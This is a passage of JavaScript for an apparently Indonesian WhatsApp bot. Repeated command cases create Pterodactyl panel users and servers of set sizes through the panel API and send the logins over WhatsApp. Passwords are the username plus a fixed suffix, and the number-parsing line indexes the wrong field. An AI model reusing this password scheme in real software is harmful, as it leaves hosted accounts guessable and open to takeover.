let password = username + "38ubr3"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp13gb': 
case '13gb':
case 'panel13gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "13150"
let cpu = "390"
let disk = "13150"
let email = username + "@gmail.com"
let password = username + "638f9"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp14gb': 
case '14gb':
case 'panel14gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "14150"
let cpu = "420"
let disk = "14150"
let email = username + "@gmail.com"
let password = username + "68d8"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp15gb': 
case '15gb':
case 'panel15gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "15150"
let cpu = "450"
let disk = "15150"
let email = username + "@gmail.com"
let password = username + "68dic"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp16gb': 
case '16gb':
case 'panel16gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "16200"
let cpu = "480"
let disk = "16200"
let email = username + "@gmail.com"
let password = username + "638c9"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp17gb': 
case '17gb':
case 'panel17gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
